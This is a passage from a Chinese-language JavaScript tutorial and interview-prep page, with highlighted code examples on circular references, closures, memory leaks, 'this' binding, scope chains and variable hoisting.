class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs JavaScript"><span class="hljs-keyword">function</span> <span class="hljs-title function_">naiveDeepClone</span>(<span class="hljs-params">obj</span>) &#123;<br>  <span class="hljs-keyword">const</span> clone = &#123;&#125;;<br>  <span class="hljs-keyword">for</span> (<span class="hljs-keyword">const</span> key <span class="hljs-keyword">in</span> obj) &#123;<br>    <span class="hljs-keyword">if</span> (<span class="hljs-keyword">typeof</span> obj[key] === <span class="hljs-string">&#x27;object&#x27;</span>) &#123;<br>      clone[key] = <span class="hljs-title function_">naiveDeepClone</span>(obj[key]);<br>    &#125; <span class="hljs-keyword">else</span> &#123;<br>      clone[key] = obj[key];<br>    &#125;<br>  &#125;<br>  <span class="hljs-keyword">return</span> clone;<br>&#125;<br><br><span class="hljs-keyword">const</span> obj = &#123;&#125;;<br>obj.<span class="hljs-property">self</span> = obj;<br><span class="hljs-title function_">naiveDeepClone</span>(obj); <span class="hljs-comment">// 栈溢出: Maximum call stack size exceeded</span><br></code></pre></td></tr></table></figure><p><strong>内存泄露问题</strong></p><p>在老版本 IE 浏览器中，循环引用可能导致内存无法被垃圾回收机制正确释放</p><h2 id="如何检测循环引用"><a href="#如何检测循环引用" class="headerlink" title="如何检测循环引用"></a>如何检测循环引用</h2><p><strong>使用 Json.stringify()</strong></p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs JavaScript"><span class="hljs-keyword">function</span> <span class="hljs-title function_">hasCircularReference</span>(<span class="hljs-params">obj</span>) &#123;<br>  <span class="hljs-keyword">try</span> &#123;<br>    <span class="hljs-title class_">JSON</span>.<span class="hljs-title function_">stringify</span>(obj);<br>    <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;<br>  &#125; <span class="hljs-keyword">catch</span> (e) &#123;<br>    <span class="hljs-keyword">return</span> e.<span class="hljs-property">message</span>.<span class="hljs-title function_">includes</span>(<span class="hljs-string">&#x27;circular&#x27;</span>);<br>  &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p><strong>使用 WeakMap&#x2F;WeakSet</strong></p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs JavaScript"><span class="hljs-keyword">function</span> <span class="hljs-title function_">hasCircular</span>(<span class="hljs-params">obj, seen = <span class="hljs-keyword">new</span> <span class="hljs-built_in">WeakSet</span>()</span>) &#123;<br>  <span class="hljs-keyword">if</span> (<span class="hljs-keyword">typeof</span> obj !== <span class="hljs-string">&#x27;object&#x27;</span> || obj === <span class="hljs-literal">null</span>) <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;<br>  <br>  <span class="hljs-keyword">if</span> (seen.<span class="hljs-title function_">has</span>(obj)) <span class="hljs-keyword">return</span> <span class="hljs-literal">true</span>;<br>  seen.<span class="hljs-title function_">add</span>(obj);<br>  <br>  <span class="hljs-keyword">for</span> (<span class="hljs-keyword">const</span> key <span class="hljs-keyword">in</span> obj) &#123;<br>    <span class="hljs-keyword">if</span> (<span class="hljs-title function_">hasCircular</span>(obj[key], seen)) <span class="hljs-keyword">return</span> <span class="hljs-literal">true</span>;<br>  &#125;<br>  <br>  <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;<br>&#125;<br></code></pre></td></tr></table></figure><h2 id="面试常见问题-1"><a href="#面试常见问题-1" class="headerlink" title="面试常见问题"></a>面试常见问题</h2><p><strong>Q：什么是循环引用？</strong></p><p>循环引用是指对象之间相互引用形成的闭环，例如</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs JavaScript"><span class="hljs-keyword">const</span> a = &#123;&#125;; <br><span class="hljs-keyword">const</span> b = &#123; <span class="hljs-attr">ref</span>: a &#125;; <br>a.<span class="hljs-property">ref</span> = b; <span class="hljs-comment">// a 引用 b，b 又引用 a</span><br></code></pre></td></tr></table></figure><p><strong>Q：循环引用会带来哪些问题？</strong></p><ol><li>Json.stringify 会抛出异常</li><li>简单的深拷贝会导致无限递归</li><li>某些情况下可能会导致内存泄露</li></ol><p><strong>Q：为什么使用 WeakMap 而不是 Map 来处理循环引用？</strong></p><p>WeakMap 的键是弱引用，不会阻止垃圾回收，更适合这种临时性的引用跟踪场景</p><h1 id="JavaScript-中的闭包"><a href="#JavaScript-中的闭包" class="headerlink" title="JavaScript 中的闭包"></a>JavaScript 中的闭包</h1><h2 id="闭包的定义"><a href="#闭包的定义" class="headerlink" title="闭包的定义"></a>闭包的定义</h2><p>闭包（closure）是指能够访问自由变量的函数，这里的自由变量是指：</p><ol><li>不是在该函数内部声明的</li><li>也不是作为函数参数传入的</li><li>而是在该函数定义时的作用域中存在的变量</li></ol><p>更通俗的说：当一个函数记住并访问它所在的词法作用域，即使该函数在其词法作用域之外执行，就产生了闭包</p><h2 id="闭包的简单示例"><a href="#闭包的简单示例" class="headerlink" title="闭包的简单示例"></a>闭包的简单示例</h2><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs JavaScript"><span class="hljs-keyword">function</span> <span class="hljs-title function_">outer</span>(<span class="hljs-params"></span>) &#123;<br>  <span class="hljs-keyword">const</span> name = <span class="hljs-string">&#x27;Alice&#x27;</span>; <span class="hljs-comment">// 自由变量</span><br>  <br>  <span class="hljs-keyword">function</span> <span class="hljs-title function_">inner</span>(<span class="hljs-params"></span>) &#123;<br>    <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(name); <span class="hljs-comment">// 访问外部函数的变量</span><br>  &#125;<br>  <br>  <span class="hljs-keyword">return</span> inner;<br>&#125;<br><br><span class="hljs-keyword">const</span> myFunc = <span class="hljs-title function_">outer</span>();<br><span class="hljs-title function_">myFunc</span>(); <span class="hljs-comment">// 输出 &quot;Alice&quot; —— 这就是闭包！</span><br></code></pre></td></tr></table></figure><p>在这个例子中：</p><ol><li>inner 函数访问了 outer 函数的局部变量 <code>name</code></li><li>inner 函数被返回并在 outer 函数外被调用</li><li>但 inner 仍然能访问 name 变量</li></ol><h2 id="闭包的工作原理"><a href="#闭包的工作原理" class="headerlink" title="闭包的工作原理"></a>闭包的工作原理</h2><p>闭包之所以能够工作，是因为 JavaScript 的作用域链（Scope Chain）机制：</p><ol><li>词法作用域：函数的作用域在定义时就已经确定，而不是在运行时</li><li>作用域链：当访问一个变量时，JavaScript 会沿着定义时的作用域链查找</li><li>变量保持：即使外部函数已经执行完毕，但只要内部函数还在引用外部变量，这些外部变量就不会被垃圾回收</li></ol><h2 id="闭包的常见应用场景"><a href="#闭包的常见应用场景" class="headerlink" title="闭包的常见应用场景"></a>闭包的常见应用场景</h2><p><strong>创建私有变量</strong></p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><code class="hljs JavaScript"><span class="hljs-keyword">function</span> <span class="hljs-title function_">createCounter</span>(<span class="hljs-params"></span>) &#123;<br>  <span class="hljs-keyword">let</span> count = <span class="hljs-number">0</span>; <span class="hljs-comment">// 私有变量</span><br>  <br>  <span class="hljs-keyword">return</span> &#123;<br>    <span class="hljs-attr">increment</span>: <span class="hljs-keyword">function</span>(<span class="hljs-params"></span>) &#123;<br>      count++;<br>      <span class="hljs-keyword">return</span> count;<br>    &#125;,<br>    <span class="hljs-attr">decrement</span>: <span class="hljs-keyword">function</span>(<span class="hljs-params"></span>) &#123;<br>      count--;<br>      <span class="hljs-keyword">return</span> count;<br>    &#125;,<br>    <span class="hljs-attr">getCount</span>: <span class="hljs-keyword">function</span>(<span class="hljs-params"></span>) &#123;<br>      <span class="hljs-keyword">return</span> count;<br>    &#125;<br>  &#125;;<br>&#125;<br><br><span class="hljs-keyword">const</span> counter = <span class="hljs-title function_">createCounter</span>();<br><span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(counter.<span class="hljs-title function_">increment</span>()); <span class="hljs-comment">// 1</span><br><span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(counter.<span class="hljs-title function_">increment</span>()); <span class="hljs-comment">// 2</span><br><span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(counter.<span class="hljs-title function_">decrement</span>()); <span class="hljs-comment">// 1</span><br><span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(counter.<span class="hljs-property">count</span>); <span class="hljs-comment">// undefined (无法直接访问)</span><br></code></pre></td></tr></table></figure><p><strong>函数工厂</strong></p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs JavaScript"><span class="hljs-keyword">function</span> <span class="hljs-title function_">createMultiplier</span>(<span class="hljs-params">factor</span>) &#123;<br>  <span class="hljs-keyword">return</span> <span class="hljs-keyword">function</span>(<span class="hljs-params">number</span>) &#123;<br>    <span class="hljs-keyword">return</span> number * factor;<br>  &#125;;<br>&#125;<br><br><span class="hljs-keyword">const</span> double = <span class="hljs-title function_">createMultiplier</span>(<span class="hljs-number">2</span>);<br><span class="hljs-keyword">const</span> triple = <span class="hljs-title function_">createMultiplier</span>(<span class="hljs-number">3</span>);<br><br><span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-title function_">double</span>(<span class="hljs-number">5</span>)); <span class="hljs-comment">// 10</span><br><span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-title function_">triple</span>(<span class="hljs-number">5</span>)); <span class="hljs-comment">// 15</span><br></code></pre></td></tr></table></figure><p><strong>模块模式</strong></p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs JavaScript"><span class="hljs-keyword">const</span> myModule = (<span class="hljs-keyword">function</span>(<span class="hljs-params"></span>) &#123;<br>  <span class="hljs-keyword">const</span> privateVar = <span class="hljs-string">&#x27;I am private&#x27;</span>;<br>  <br>  <span class="hljs-keyword">function</span> <span class="hljs-title function_">privateMethod</span>(<span class="hljs-params"></span>) &#123;<br>    <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(privateVar);<br>  &#125;<br>  <br>  <span class="hljs-keyword">return</span> &#123;<br>    <span class="hljs-attr">publicMethod</span>: <span class="hljs-keyword">function</span>(<span class="hljs-params"></span>) &#123;<br>      <span class="hljs-title function_">privateMethod</span>();<br>    &#125;<br>  &#125;;<br>&#125;)();<br><br>myModule.<span class="hljs-title function_">publicMethod</span>(); <span class="hljs-comment">// &quot;I am private&quot;</span><br></code></pre></td></tr></table></figure><p><strong>事件处理和回调</strong></p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs JavaScript"><span class="hljs-keyword">function</span> <span class="hljs-title function_">setupButtons</span>(<span class="hljs-params"></span>) &#123;<br>  <span class="hljs-keyword">const</span> buttons = <span class="hljs-variable language_">document</span>.<span class="hljs-title function_">querySelectorAll</span>(<span class="hljs-string">&#x27;button&#x27;</span>);<br>  <br>  <span class="hljs-keyword">for</span> (<span class="hljs-keyword">var</span> i = <span class="hljs-number">0</span>; i &lt; buttons.<span class="hljs-property">length</span>; i++) &#123;<br>    (<span class="hljs-keyword">function</span>(<span class="hljs-params">index</span>) &#123;<br>      buttons[index].<span class="hljs-title function_">addEventListener</span>(<span class="hljs-string">&#x27;click&#x27;</span>, <span class="hljs-keyword">function</span>(<span class="hljs-params"></span>) &#123;<br>        <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">&#x27;Button &#x27;</span> + index + <span class="hljs-string">&#x27; clicked&#x27;</span>);<br>      &#125;);<br>    &#125;)(i);<br>  &#125;<br>&#125;<br></code></pre></td></tr></table></figure><h2 id="闭包与内存管理"><a href="#闭包与内存管理" class="headerlink" title="闭包与内存管理"></a>闭包与内存管理</h2><p><strong>内存泄露风险</strong></p><p>闭包会阻止外部函数作用域中的变量被垃圾回收，不当使用会导致内存泄露</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs JavaScript"><span class="hljs-keyword">function</span> <span class="hljs-title function_">leakMemory</span>(<span class="hljs-params"></span>) &#123;<br>  <span class="hljs-keyword">const</span> hugeArray = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Array</span>(<span class="hljs-number">1000000</span>).<span class="hljs-title function_">fill</span>(<span class="hljs-string">&#x27;*&#x27;</span>);<br>  <br>  <span class="hljs-keyword">return</span> <span class="hljs-keyword">function</span>(<span class="hljs-params"></span>) &#123;<br>    <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">&#x27;I have access to hugeArray&#x27;</span>);<br>  &#125;;<br>&#125;<br><br><span class="hljs-keyword">const</span> leakingFunction = <span class="hljs-title function_">leakMemory</span>(); <span class="hljs-comment">// hugeArray 不会被回收</span><br><br><span class="hljs-comment">// 为什么 return function 中没有使用 hugeArray 却还是造成了内存泄露？</span><br><span class="hljs-comment">// 因为闭包会保存其所在的整个词法环境（包括所有可访问的变量），而不仅仅是其实际使用的变量</span><br></code></pre></td></tr></table></figure><p><strong>避免内存泄露的方法</strong></p><p>（1）及时解除引用</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs JavaScript">leakingFunction = <span class="hljs-literal">null</span>; <span class="hljs-comment">// 解除引用，允许垃圾回收</span><br></code></pre></td></tr></table></figure><p>（2）使用块级作用域变量 let&#x2F;const 代替 var</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs JavaScript"><span class="hljs-keyword">function</span> <span class="hljs-title function_">setupButtons</span>(<span class="hljs-params"></span>) &#123;<br>  <span class="hljs-keyword">const</span> buttons = <span class="hljs-variable language_">document</span>.<span class="hljs-title function_">querySelectorAll</span>(<span class="hljs-string">&#x27;button&#x27;</span>);<br>  <br>  <span class="hljs-keyword">for</span> (<span class="hljs-keyword">let</span> i = <span class="hljs-number">0</span>; i &lt; buttons.<span class="hljs-property">length</span>; i++) &#123;<br>    buttons[i].<span class="hljs-title function_">addEventListener</span>(<span class="hljs-string">&#x27;click&#x27;</span>, <span class="hljs-keyword">function</span>(<span class="hljs-params"></span>) &#123;<br>      <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">&#x27;Button &#x27;</span> + i + <span class="hljs-string">&#x27; clicked&#x27;</span>);<br>    &#125;);<br>  &#125;<br>&#125;<br></code></pre></td></tr></table></figure><h2 id="闭包的进阶理解"><a href="#闭包的进阶理解" class="headerlink" title="闭包的进阶理解"></a>闭包的进阶理解</h2><p><strong>闭包与循环</strong></p><p>经典的闭包面试题：</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs JavaScript"><span class="hljs-keyword">for</span> (<span class="hljs-keyword">var</span> i = <span class="hljs-number">0</span>; i &lt; <span class="hljs-number">5</span>; i++) &#123;<br>  <span class="hljs-built_in">setTimeout</span>(<span class="hljs-keyword">function</span>(<span class="hljs-params"></span>) &#123;<br>    <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(i);<br>  &#125;, <span class="hljs-number">1000</span>);<br>&#125;<br><span class="hljs-comment">// 输出五个 5，而不是 0,1,2,3,4</span><br></code></pre></td></tr></table></figure><p>解决方法：<br>（1）使用IIFE（立即执行函数表达式）</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs JavaScript"><span class="hljs-keyword">for</span> (<span class="hljs-keyword">var</span> i = <span class="hljs-number">0</span>; i &lt; <span class="hljs-number">5</span>; i++) &#123;<br>  (<span class="hljs-keyword">function</span>(<span class="hljs-params">j</span>) &#123;<br>    <span class="hljs-built_in">setTimeout</span>(<span class="hljs-keyword">function</span>(<span class="hljs-params"></span>) &#123;<br>      <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(j);<br>    &#125;, <span class="hljs-number">1000</span>);<br>  &#125;)(i);<br>&#125;<br></code></pre></td></tr></table></figure><p>（2）使用 let 块级作用域</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs JavaScript"><span class="hljs-keyword">for</span> (<span class="hljs-keyword">let</span> i = <span class="hljs-number">0</span>; i &lt; <span class="hljs-number">5</span>; i++) &#123;<br>  <span class="hljs-built_in">setTimeout</span>(<span class="hljs-keyword">function</span>(<span class="hljs-params"></span>) &#123;<br>    <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(i);<br>  &#125;, <span class="hljs-number">1000</span>);<br>&#125;<br></code></pre></td></tr></table></figure><p><strong>闭包与 this 指向</strong></p><p>闭包中的 this 需要特别注意：</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs JavaScript"><span class="hljs-keyword">const</span> obj = &#123;<br>  <span class="hljs-attr">name</span>: <span class="hljs-string">&#x27;Alice&#x27;</span>,<br>  <span class="hljs-attr">sayName</span>: <span class="hljs-keyword">function</span>(<span class="hljs-params"></span>) &#123;<br>    <span class="hljs-keyword">return</span> <span class="hljs-keyword">function</span>(<span class="hljs-params"></span>) &#123;<br>      <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-variable language_">this</span>.<span class="hljs-property">name</span>); <span class="hljs-comment">// 这里的 this 指向全局或 undefined</span><br>    &#125;;<br>  &#125;<br>&#125;;<br><br>obj.<span class="hljs-title function_">sayName</span>()(); <span class="hljs-comment">// 输出 undefined 或报错</span><br></code></pre></td></tr></table></figure><p>解决方法：<br>（1）使用箭头函数</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs JavaScript"><span class="hljs-keyword">const</span> obj = &#123;<br>  <span class="hljs-attr">name</span>: <span class="hljs-string">&#x27;Alice&#x27;</span>,<br>  <span class="hljs-attr">sayName</span>: <span class="hljs-keyword">function</span>(<span class="hljs-params"></span>) &#123;<br>    <span class="hljs-keyword">return</span> <span class="hljs-function">() =&gt;</span> &#123;<br>      <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-variable language_">this</span>.<span class="hljs-property">name</span>); <span class="hljs-comment">// 箭头函数继承外层 this</span><br>    &#125;;<br>  &#125;<br>&#125;;<br></code></pre></td></tr></table></figure><p>（2）保存 this 引用</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs JavaScript"><span class="hljs-keyword">const</span> obj = &#123;<br>  <span class="hljs-attr">name</span>: <span class="hljs-string">&#x27;Alice&#x27;</span>,<br>  <span class="hljs-attr">sayName</span>: <span class="hljs-keyword">function</span>(<span class="hljs-params"></span>) &#123;<br>    <span class="hljs-keyword">const</span> self = <span class="hljs-variable language_">this</span>;<br>    <span class="hljs-keyword">return</span> <span class="hljs-keyword">function</span>(<span class="hljs-params"></span>) &#123;<br>      <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(self.<span class="hljs-property">name</span>);<br>    &#125;;<br>  &#125;<br>&#125;;<br></code></pre></td></tr></table></figure><h2 id="闭包的优缺点"><a href="#闭包的优缺点" class="headerlink" title="闭包的优缺点"></a>闭包的优缺点</h2><p><strong>优点</strong></p><ul><li>创建私有变量和方法</li><li>保持变量状态</li><li>实现数据封装</li><li>实现函数工厂和模块模式</li></ul><p><strong>缺点</strong></p><ul><li>可能导致内存泄漏</li><li>过度使用可能会导致代码难以理解和调试</li><li>可能影响性能（变量查找要沿着作用域链）</li></ul><h2 id="面试常见问题-2"><a href="#面试常见问题-2" class="headerlink" title="面试常见问题"></a>面试常见问题</h2><p><strong>Q：如何用闭包实现一个计数器</strong></p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs JavaScript"><span class="hljs-keyword">function</span> <span class="hljs-title function_">createCounter</span>(<span class="hljs-params"></span>) &#123;<br>  <span class="hljs-keyword">let</span> count = <span class="hljs-number">0</span>;<br>  <span class="hljs-keyword">return</span> <span class="hljs-keyword">function</span>(<span class="hljs-params"></span>) &#123;<br>    <span class="hljs-keyword">return</span> ++count;<br>  &#125;;<br>&#125;<br></code></pre></td></tr></table></figure><h1 id="作用域-作用域链-this指向"><a href="#作用域-作用域链-this指向" class="headerlink" title="作用域&#x2F;作用域链&#x2F;this指向"></a>作用域&#x2F;作用域链&#x2F;this指向</h1><h2 id="作用域（Scope）"><a href="#作用域（Scope）" class="headerlink" title="作用域（Scope）"></a>作用域（Scope）</h2><p><strong>基本概念</strong></p><p>JavaScript 中，作用域是指程序中定义变量的区域，它决定了变量的可访问性（变量在何处可用）</p><p><strong>JavaScript 的作用域类型</strong></p><p>（1）全局作用域</p><ul><li>在函数或代码块外部声明的变量</li><li>在任何地方都可以访问</li><li>在浏览器环境中，全局作用域是 window 对象</li></ul><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs JavaScript"><span class="hljs-keyword">var</span> globalVar = <span class="hljs-string">&#x27;全局变量&#x27;</span>;<br><br><span class="hljs-keyword">function</span> <span class="hljs-title function_">test</span>(<span class="hljs-params"></span>) &#123;<br>  <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(globalVar); <span class="hljs-comment">// 可以访问</span><br>&#125;<br></code></pre></td></tr></table></figure><p>（2）函数作用域（局部作用域）</p><ul><li>在函数内部声明的变量</li><li>只能在函数内部访问</li></ul><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs JavaScript"><span class="hljs-keyword">function</span> <span class="hljs-title function_">test</span>(<span class="hljs-params"></span>) &#123;<br>  <span class="hljs-keyword">var</span> localVar = <span class="hljs-string">&#x27;局部变量&#x27;</span>;<br>  <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(localVar); <span class="hljs-comment">// 可以访问</span><br>&#125;<br><span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(localVar); <span class="hljs-comment">// 报错: localVar is not defined</span><br></code></pre></td></tr></table></figure><p>（3）块级作用域（ES6+）</p><ul><li>使用 let 和 const 声明的变量</li><li>只在{}代码块中有效</li></ul><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs JavaScript"><span class="hljs-keyword">if</span> (<span class="hljs-literal">true</span>) &#123;<br>  <span class="hljs-keyword">let</span> blockVar = <span class="hljs-string">&#x27;块级变量&#x27;</span>;<br>  <span class="hljs-keyword">const</span> constVar = <span class="hljs-string">&#x27;常量&#x27;</span>;<br>&#125;<br><span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(blockVar); <span class="hljs-comment">// 报错</span><br><span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(constVar); <span class="hljs-comment">// 报错</span><br></code></pre></td></tr></table></figure><p><strong>变量提升</strong></p><ul><li>var 声明的变量会被提升到函数&#x2F;全局作用域的顶部</li><li>let 和 const 有暂时性死区（TDZ），不会提升</li></ul><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs JavaScript"><span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(a); <span class="hljs-comment">// undefined (变量提升)</span><br><span class="hljs-keyword">var</span> a = <span class="hljs-number">1</span>;<br><br><span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(b); <span class="hljs-comment">// 报错: Cannot access &#x27;b&#x27; before initialization</span><br><span class="hljs-keyword">let</span> b = <span class="hljs-number">2</span>;<br></code></pre></td></tr></table></figure><h2 id="作用域链（Scope-Chain）"><a href="#作用域链（Scope-Chain）" class="headerlink" title="作用域链（Scope Chain）"></a>作用域链（Scope Chain）</h2><p><strong>基本概念</strong></p><ul><li>当访问一个变量时，JavaScript 会从当前作用域开始查找</li><li>如果当前作用域内找不到时，会向上一级作用域查找，直至全局作用域</li><li>这种链式查找过程被称为作用域链</li></ul><p><strong>作用域链的形成</strong></p><ul><li>每个函数在创建时都会保存其所在的作用域链</li><li>函数在执行时会创建新的作用域链，并添加到作用域链前端</li></ul><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs JavaScript"><span class="hljs-keyword">var</span> globalVar = <span class="hljs-string">&#x27;global&#x27;</span>;<br><br><span class="hljs-keyword">function</span> <span class="hljs-title function_">outer</span>(<span class="hljs-params"></span>) &#123;<br>  <span class="hljs-keyword">var</span> outerVar = <span class="hljs-string">&#x27;outer&#x27;</span>;<br>  <br>  <span class="hljs-keyword">function</span> <span class="hljs-title function_">inner</span>(<span class="hljs-params"></span>) &#123;<br>    <span class="hljs-keyword">var</span> innerVar = <span class="hljs-string">&#x27;inner&#x27;</span>;<br>    <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(innerVar); <span class="hljs-comment">// 当前作用域</span><br>    <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(outerVar); <span class="hljs-comment">// 外层作用域</span><br>    <span class="hljs-variable language_">console</span>.<span class="hljs-title 